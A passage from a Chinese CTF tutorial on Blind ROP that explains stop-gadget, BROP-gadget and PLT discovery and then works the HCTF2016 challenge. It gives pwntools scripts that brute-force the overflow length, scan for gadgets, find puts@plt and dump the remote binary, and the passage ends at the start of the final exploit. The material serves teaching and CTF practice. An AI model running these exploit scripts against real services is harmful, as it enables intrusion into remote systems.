<pre><code>pop rdi; ret # socket
pop rsi; ret # buffer
pop rdx; ret # length
pop rax; ret # write syscall number
syscall</code></pre><p>但通常来说，这样的方法都是比较困难的，因为想要找到一个 syscall 的地址基本不可能。。。我们可以通过转换为找 write 的方式来获取。</p>
<h6 id="BROP-gadgets"><a href="#BROP-gadgets" class="headerlink" title="BROP gadgets"></a>BROP gadgets</h6><p>首先，在 libc_csu_init 的结尾一长串的 gadgets，我们可以通过偏移来获取 write 函数调用的前两个参数。正如文中所展示的</p>
<p><img src="/images/loading.gif" data-original="../images/CTF/brop_gadget.png" alt=""></p>
<h6 id="find-a-call-write"><a href="#find-a-call-write" class="headerlink" title="find a call write"></a>find a call write</h6><p>我们可以通过 plt 表来获取 write 的地址。</p>
<h6 id="control-rdx"><a href="#control-rdx" class="headerlink" title="control rdx"></a>control rdx</h6><p>需要注意的是，rdx 只是我们用来输出程序字节长度的变量，只要不为 0 即可。一般来说程序中的 rdx 经常性会不是零。但是为了更好地控制程序输出，我们仍然尽量可以控制这个值。但是，在程序</p>
<pre><code>pop rdx; ret</code></pre><p>这样的指令几乎没有。那么，我们该如何控制 rdx 的数值呢？这里需要说明执行 strcmp 的时候，rdx 会被设置为将要被比较的字符串的长度，所以我们可以找到 strcmp 函数，从而来控制 rdx。</p>
<p>那么接下来的问题，我们就可以分为两项</p>
<ul>
<li>寻找 gadgets</li>
<li>寻找 PLT 表<ul>
<li>write 入口</li>
<li>strcmp 入口</li>
</ul>
</li>
</ul>
<h5 id="寻找-GADGETS"><a href="#寻找-GADGETS" class="headerlink" title="寻找 GADGETS"></a>寻找 GADGETS</h5><p>首先，我们来想办法寻找 gadgets。此时，由于尚未知道程序具体长什么样，所以我们只能通过简单的控制程序的返回地址为自己设置的值，从而而来猜测相应的 gadgets。而当我们控制程序的返回地址时，一般有以下几种情况</p>
<ul>
<li>程序直接崩溃</li>
<li>程序运行一段时间后崩溃</li>
<li>程序一直运行而并不崩溃</li>
</ul>
<p>为了寻找合理的 gadgets，我们可以分为以下两步</p>
<h6 id="寻找-stop-gadgets"><a href="#寻找-stop-gadgets" class="headerlink" title="寻找 stop gadgets"></a>寻找 stop gadgets</h6><p>所谓<code>stop gadget</code>一般指的是这样一段代码：当程序的执行这段代码时，程序会进入无限循环，这样使得攻击者能够一直保持连接状态。</p>
<blockquote>
<p>其实 stop gadget 也并不一定得是上面的样子，其根本的目的在于告诉攻击者，所测试的返回地址是一个 gadgets。</p>
</blockquote>
<p>之所以要寻找 stop gadgets，是因为当我们猜到某个 gadgtes 后，如果我们仅仅是将其布置在栈上，由于执行完这个 gadget 之后，程序还会跳到栈上的下一个地址。如果该地址是非法地址，那么程序就会 crash。这样的话，在攻击者看来程序只是单纯的 crash 了。因此，攻击者就会认为在这个过程中并没有执行到任何的<code>useful gadget</code>，从而放弃它。例子如下图</p>
<p><img src="/images/loading.gif" data-original="../images/CTF/stop_gadget.png" alt=""></p>
<p>但是，如果我们布置了<code>stop gadget</code>，那么对于我们所要尝试的每一个地址，如果它是一个 gadget 的话，那么程序不会崩溃。接下来，就是去想办法识别这些 gadget。</p>
<h6 id="识别-gadgets"><a href="#识别-gadgets" class="headerlink" title="识别 gadgets"></a>识别 gadgets</h6><p>那么，我们该如何识别这些 gadgets 呢？我们可以通过栈布局以及程序的行为来进行识别。为了更加容易地进行介绍，这里定义栈上的三种地址</p>
<ul>
<li>Probe<ul>
<li>探针，也就是我们想要探测的代码地址。一般来说，都是 64 位程序，可以直接从 0x400000 尝试，如果不成功，有可能程序开启了 PIE 保护，再不济，就可能是程序是 32 位了。。这里我还没有特别想明白，怎么可以快速确定远程的位数。</li>
</ul>
</li>
<li>Stop<ul>
<li>不会使得程序崩溃的 stop gadget 的地址。</li>
</ul>
</li>
<li>Trap<ul>
<li>可以导致程序崩溃的地址</li>
</ul>
</li>
</ul>
<p>我们可以通过在栈上摆放不同顺序的 <strong>Stop</strong> 与 <strong>Trap</strong> 从而来识别出正在执行的指令。因为执行 Stop 意味着程序不会崩溃，执行 Trap 意味着程序会立即崩溃。这里给出几个例子</p>
<ul>
<li><p>probe,stop,traps(traps,traps,…)</p>
<ul>
<li><p>我们通过程序崩溃与否 (</p>
<p>如果程序在 probe 处直接崩溃怎么判断</p>
<p>) 可以找到不会对栈进行 pop 操作的 gadget，如</p>
<ul>
<li>ret</li>
<li>xor eax,eax; ret</li>
</ul>
</li>
</ul>
</li>
<li><p>probe,trap,stop,traps</p>
<ul>
<li>我们可以通过这样的布局找到只是弹出一个栈变量的 gadget。如<ul>
<li>pop rax; ret</li>
<li>pop rdi; ret</li>
</ul>
</li>
</ul>
</li>
<li><p>probe, trap, trap, trap, trap, trap, trap, stop, traps</p>
<ul>
<li><p>我们可以通过这样的布局来找到弹出 6 个栈变量的 gadget，也就是与 brop gadget 相似的 gadget。</p>
<p>这里感觉原文是有问题的，比如说如果遇到了只是 pop 一个栈变量的地址，其实也是不会崩溃的，，</p>
<p>这里一般来说会遇到两处比较有意思的地方</p>
<ul>
<li>plt 处不会崩，，</li>
<li>_start 处不会崩，相当于程序重新执行。</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>之所以要在每个布局的后面都放上 trap，是为了能够识别出，当我们的 probe 处对应的地址执行的指令跳过了 stop，程序立马崩溃的行为。</p>
<p>但是，即使是这样，我们仍然难以识别出正在执行的 gadget 到底是在对哪个寄存器进行操作。</p>
<p>但是，需要注意的是向 BROP 这样的一下子弹出 6 个寄存器的 gadgets，程序中并不经常出现。所以，如果我们发现了这样的 gadgets，那么，有很大的可能性，这个 gadgets 就是 brop gadgets。此外，这个 gadgets 通过错位还可以生成 pop rsp 等这样的 gadgets，可以使得程序崩溃也可以作为识别这个 gadgets 的标志。</p>
<p>此外，根据我们之前学的 ret2libc_csu_init 可以知道该地址减去 0x1a 就会得到其上一个 gadgets。可以供我们调用其它函数。</p>
<p>需要注意的是 probe 可能是一个 stop gadget，我们得去检查一下，怎么检查呢？我们只需要让后面所有的内容变为 trap 地址即可。因为如果是 stop gadget 的话，程序会正常执行，否则就会崩溃。看起来似乎很有意思.</p>
<h5 id="寻找-PLT"><a href="#寻找-PLT" class="headerlink" title="寻找 PLT"></a>寻找 PLT</h5><p>如下图所示，程序的 plt 表具有比较规整的结构，每一个 plt 表项都是 16 字节。而且，在每一个表项的 6 字节偏移处，是该表项对应的函数的解析路径，即程序最初执行该函数的时候，会执行该路径对函数的 got 地址进行解析。</p>
<p><img src="/images/loading.gif" data-original="../images/CTF/brop_plt.png" alt=""></p>
<p>此外，对于大多数 plt 调用来说，一般都不容易崩溃，即使是使用了比较奇怪的参数。所以说，如果我们发现了一系列的长度为 16 的没有使得程序崩溃的代码段，那么我们有一定的理由相信我们遇到了 plt 表。除此之外，我们还可以通过前后偏移 6 字节，来判断我们是处于 plt 表项中间还是说处于开头。</p>
<h5 id="控制-RDX"><a href="#控制-RDX" class="headerlink" title="控制 RDX"></a>控制 RDX</h5><p>当我们找到 plt 表之后，下面，我们就该想办法来控制 rdx 的数值了，那么该如何确认 strcmp 的位置呢？需要提前说的是，并不是所有的程序都会调用 strcmp 函数，所以在没有调用 strcmp 函数的情况下，我们就得利用其它方式来控制 rdx 的值了。这里给出程序中使用 strcmp 函数的情况。</p>
<p>之前，我们已经找到了 brop 的 gadgets，所以我们可以控制函数的前两个参数了。与此同时，我们定义以下两种地址</p>
<ul>
<li>readable，可读的地址。</li>
<li>bad, 非法地址，不可访问，比如说 0x0。</li>
</ul>
<p>那么我们如果控制传递的参数为这两种地址的组合，会出现以下四种情况</p>
<ul>
<li>strcmp(bad,bad)</li>
<li>strcmp(bad,readable)</li>
<li>strcmp(readable,bad)</li>
<li>strcmp(readable,readable)</li>
</ul>
<p>只有最后一种格式，程序才会正常执行。</p>
<p><strong>注</strong>：在没有 PIE 保护的时候，64 位程序的 ELF 文件的 0x400000 处有 7 个非零字节。</p>
<p>那么我们该如何具体地去做呢？有一种比较直接的方法就是从头到尾依次扫描每个 plt 表项，但是这个却比较麻烦。我们可以选择如下的一种方法</p>
<ul>
<li>利用 plt 表项的慢路径</li>
<li>并且利用下一个表项的慢路径的地址来覆盖返回地址</li>
</ul>
<p>这样，我们就不用来回控制相应的变量了。</p>
<p>当然，我们也可能碰巧找到 strncmp 或者 strcasecmp 函数，它们具有和 strcmp 一样的效果。</p>
<h5 id="寻找输出函数"><a href="#寻找输出函数" class="headerlink" title="寻找输出函数"></a>寻找输出函数</h5><p>寻找输出函数既可以寻找 write，也可以寻找 puts。一般现先找 puts 函数。不过这里为了介绍方便，先介绍如何寻找 write。</p>
<h6 id="寻找-write-plt"><a href="#寻找-write-plt" class="headerlink" title="寻找 write@plt"></a>寻找 write@plt</h6><p>当我们可以控制 write 函数的三个参数的时候，我们就可以再次遍历所有的 plt 表，根据 write 函数将会输出内容来找到对应的函数。需要注意的是，这里有个比较麻烦的地方在于我们需要找到文件描述符的值。一般情况下，我们有两种方法来找到这个值</p>
<ul>
<li>使用 rop chain，同时使得每个 rop 对应的文件描述符不一样</li>
<li>同时打开多个连接，并且我们使用相对较高的数值来试一试。</li>
</ul>
<p>需要注意的是</p>
<ul>
<li>linux 默认情况下，一个进程最多只能打开 1024 个文件描述符。</li>
<li>posix 标准每次申请的文件描述符数值总是当前最小可用数值。</li>
</ul>
<p>当然，我们也可以选择寻找 puts 函数。</p>
<h6 id="寻找-puts-plt"><a href="#寻找-puts-plt" class="headerlink" title="寻找 puts@plt"></a>寻找 puts@plt</h6><p>寻找 puts 函数 (这里我们寻找的是 plt)，我们自然需要控制 rdi 参数，在上面，我们已经找到了 brop gadget。那么，我们根据 brop gadget 偏移 9 可以得到相应的 gadgets（由 ret2libc_csu_init 中后续可得）。同时在程序还没有开启 PIE 保护的情况下，0x400000 处为 ELF 文件的头部，其内容为 \ x7fELF。所以我们可以根据这个来进行判断。一般来说，其 payload 如下</p>
<pre><code>payload = 'A'*length +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)</code></pre><h4 id="攻击总结"><a href="#攻击总结" class="headerlink" title="攻击总结"></a>攻击总结</h4><p>此时，攻击者已经可以控制输出函数了，那么攻击者就可以输出. text 段更多的内容以便于来找到更多合适 gadgets。同时，攻击者还可以找到一些其它函数，如 dup2 或者 execve 函数。一般来说，攻击者此时会去做下事情</p>
<ul>
<li>将 socket 输出重定向到输入输出</li>
<li>寻找 “/bin/sh” 的地址。一般来说，最好是找到一块可写的内存，利用 write 函数将这个字符串写到相应的地址。</li>
<li>执行 execve 获取 shell，获取 execve 不一定在 plt 表中，此时攻击者就需要想办法执行系统调用了。</li>
</ul>
<h3 id="例子-4"><a href="#例子-4" class="headerlink" title="例子"></a>例子</h3><p>这里我们以 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/brop/hctf2016-brop" target="_blank" rel="noopener">HCTF2016 的出题人失踪了</a> 为例。基本思路如下</p>
<h4 id="确定栈溢出长度"><a href="#确定栈溢出长度" class="headerlink" title="确定栈溢出长度"></a>确定栈溢出长度</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">getbufferflow_length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    i <span class="token operator">=</span> <span class="token number">1</span>
    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span>
            sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'WelCome my friend,Do you know password?\n'</span><span class="token punctuation">)</span>
            sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token string">'a'</span><span class="token punctuation">)</span>
            output <span class="token operator">=</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
            sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token operator">not</span> output<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'No password'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> i <span class="token operator">-</span> <span class="token number">1</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                i <span class="token operator">+=</span> <span class="token number">1</span>
        <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>
            sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> i <span class="token operator">-</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>根据上面，我们可以确定，栈溢出的长度为 72。同时，根据回显信息可以发现程序并没有开启 canary 保护，否则，就会有相应的报错内容。所以我们不需要执行 stack reading。</p>
<h4 id="寻找-stop-gadgets-1"><a href="#寻找-stop-gadgets-1" class="headerlink" title="寻找 stop gadgets"></a>寻找 stop gadgets</h4><p>寻找过程如下</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_stop_addr</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
    addr <span class="token operator">=</span> <span class="token number">0x400000</span>
    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span>
            sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'password?\n'</span><span class="token punctuation">)</span>
            payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> length <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
            sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
            sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
            sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span> <span class="token string">'one success addr: 0x%x'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
            <span class="token keyword">return</span> addr
        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
            addr <span class="token operator">+=</span> <span class="token number">1</span>
            sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里我们直接尝试 64 位程序没有开启 PIE 的情况，因为一般是这个样子的，，，如果开启了，，那就按照开启了的方法做，，结果发现了不少，，我选择了一个貌似返回到源程序中的地址</p>
<pre><code>one success stop gadget addr: 0x4006b6</code></pre><h4 id="识别-brop-gadgets"><a href="#识别-brop-gadgets" class="headerlink" title="识别 brop gadgets"></a>识别 brop gadgets</h4><p>下面，我们根据上面介绍的原理来得到对应的 brop gadgets 地址。构造如下，get_brop_gadget 是为了得到可能的 brop gadget，后面的 check_brop_gadget 是为了检查。</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_brop_gadget</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span> stop_gadget<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span>
        sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'password?\n'</span><span class="token punctuation">)</span>
        payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> length <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">6</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>
            stop_gadget<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">10</span>
        sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
        content <span class="token operator">=</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
        sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span> content
        <span class="token comment" spellcheck="true"># stop gadget returns memory</span>
        <span class="token keyword">if</span> <span class="token operator">not</span> content<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'WelCome'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>


<span class="token keyword">def</span> <span class="token function">check_brop_gadget</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span>
        sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'password?\n'</span><span class="token punctuation">)</span>
        payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> length <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token number">10</span>
        sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
        content <span class="token operator">=</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
        sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>


<span class="token comment" spellcheck="true">##length = getbufferflow_length()</span>
length <span class="token operator">=</span> <span class="token number">72</span>
<span class="token comment" spellcheck="true">##get_stop_addr(length)</span>
stop_gadget <span class="token operator">=</span> <span class="token number">0x4006b6</span>
addr <span class="token operator">=</span> <span class="token number">0x400740</span>
<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span> hex<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
    <span class="token keyword">if</span> get_brop_gadget<span class="token punctuation">(</span>length<span class="token punctuation">,</span> stop_gadget<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">'possible brop gadget: 0x%x'</span> <span class="token operator">%</span> addr
        <span class="token keyword">if</span> check_brop_gadget<span class="token punctuation">(</span>length<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span> <span class="token string">'success brop gadget: 0x%x'</span> <span class="token operator">%</span> addr
            <span class="token keyword">break</span>
    addr <span class="token operator">+=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这样，我们基本得到了 brop 的 gadgets 地址 0x4007ba</p>
<h4 id="确定-puts-plt-地址"><a href="#确定-puts-plt-地址" class="headerlink" title="确定 puts@plt 地址"></a>确定 puts@plt 地址</h4><p>根据上面，所说我们可以构造如下 payload 来进行获取</p>
<pre><code>payload = 'A'*72 +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)</code></pre><p>具体函数如下</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_puts_addr</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span> rdi_ret<span class="token punctuation">,</span> stop_gadget<span class="token punctuation">)</span><span class="token punctuation">:</span>
    addr <span class="token operator">=</span> <span class="token number">0x400000</span>
    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span> hex<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
        sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span>
        sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'password?\n'</span><span class="token punctuation">)</span>
        payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> length <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x400000</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>
            addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stop_gadget<span class="token punctuation">)</span>
        sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            content <span class="token operator">=</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> content<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'\x7fELF'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span> <span class="token string">'find puts@plt addr: 0x%x'</span> <span class="token operator">%</span> addr
                <span class="token keyword">return</span> addr
            sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
            addr <span class="token operator">+=</span> <span class="token number">1</span>
        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
            sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
            addr <span class="token operator">+=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>最后根据 plt 的结构，选择 0x400560 作为 puts@plt</p>
<h4 id="泄露-puts-got-地址"><a href="#泄露-puts-got-地址" class="headerlink" title="泄露 puts@got 地址"></a>泄露 puts@got 地址</h4><p>在我们可以调用 puts 函数后，我们可以泄露 puts 函数的地址，进而获取 libc 版本，从而获取相关的 system 函数地址与 / bin/sh 地址，从而获取 shell。我们从 0x400000 开始泄露 0x1000 个字节，这已经足够包含程序的 plt 部分了。代码如下</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span> rdi_ret<span class="token punctuation">,</span> puts_plt<span class="token punctuation">,</span> leak_addr<span class="token punctuation">,</span> stop_gadget<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> length <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>
        puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stop_gadget<span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'password?\n'</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
        sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            data <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token punctuation">:</span>data<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">"\nWelCome"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
            data <span class="token operator">=</span> data
        <span class="token keyword">if</span> data <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>
            data <span class="token operator">=</span> <span class="token string">'\x00'</span>
        <span class="token keyword">return</span> data
    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> None


<span class="token comment" spellcheck="true">##length = getbufferflow_length()</span>
length <span class="token operator">=</span> <span class="token number">72</span>
<span class="token comment" spellcheck="true">##stop_gadget = get_stop_addr(length)</span>
stop_gadget <span class="token operator">=</span> <span class="token number">0x4006b6</span>
<span class="token comment" spellcheck="true">##brop_gadget = find_brop_gadget(length,stop_gadget)</span>
brop_gadget <span class="token operator">=</span> <span class="token number">0x4007ba</span>
rdi_ret <span class="token operator">=</span> brop_gadget <span class="token operator">+</span> <span class="token number">9</span>
<span class="token comment" spellcheck="true">##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)</span>
puts_plt <span class="token operator">=</span> <span class="token number">0x400560</span>
addr <span class="token operator">=</span> <span class="token number">0x400000</span>
result <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">while</span> addr <span class="token operator">&lt;</span> <span class="token number">0x401000</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span> hex<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
    data <span class="token operator">=</span> leak<span class="token punctuation">(</span>length<span class="token punctuation">,</span> rdi_ret<span class="token punctuation">,</span> puts_plt<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> stop_gadget<span class="token punctuation">)</span>
    <span class="token keyword">if</span> data <span class="token keyword">is</span> None<span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        result <span class="token operator">+=</span> data
    addr <span class="token operator">+=</span> len<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'code'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>最后，我们将泄露的内容写到文件里。需要注意的是如果泄露出来的是 “”, 那说明我们遇到了’\x00’，因为 puts 是输出字符串，字符串是以’\x00’为终止符的。之后利用 ida 打开 binary 模式，首先在 edit-&gt;segments-&gt;rebase program 将程序的基地址改为 0x400000，然后找到偏移 0x560 处，如下</p>
<pre><code>seg000:0000000000400560                 db 0FFh
seg000:0000000000400561                 db  25h ; %
seg000:0000000000400562                 db 0B2h ;
seg000:0000000000400563                 db  0Ah
seg000:0000000000400564                 db  20h
seg000:0000000000400565                 db    0</code></pre><p>然后按下 c, 将此处的数据转换为汇编指令，如下</p>
<pre><code>seg000:0000000000400560 ; ---------------------------------------------------------------------------
seg000:0000000000400560                 jmp     qword ptr cs:601018h
seg000:0000000000400566 ; ---------------------------------------------------------------------------
seg000:0000000000400566                 push    0
seg000:000000000040056B                 jmp     loc_400550
seg000:000000000040056B ; ---------------------------------------------------------------------------</code></pre><p>这说明，puts@got 的地址为 0x601018。</p>
<h4 id="程序利用"><a href="#程序利用" class="headerlink" title="程序利用"></a>程序利用</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">##length = getbufferflow_length()</span>
length <span class="token operator">=</span> <span class="token number">72</span>
<span class="token comment" spellcheck="true">##stop_gadget = get_stop_addr(length)</span>
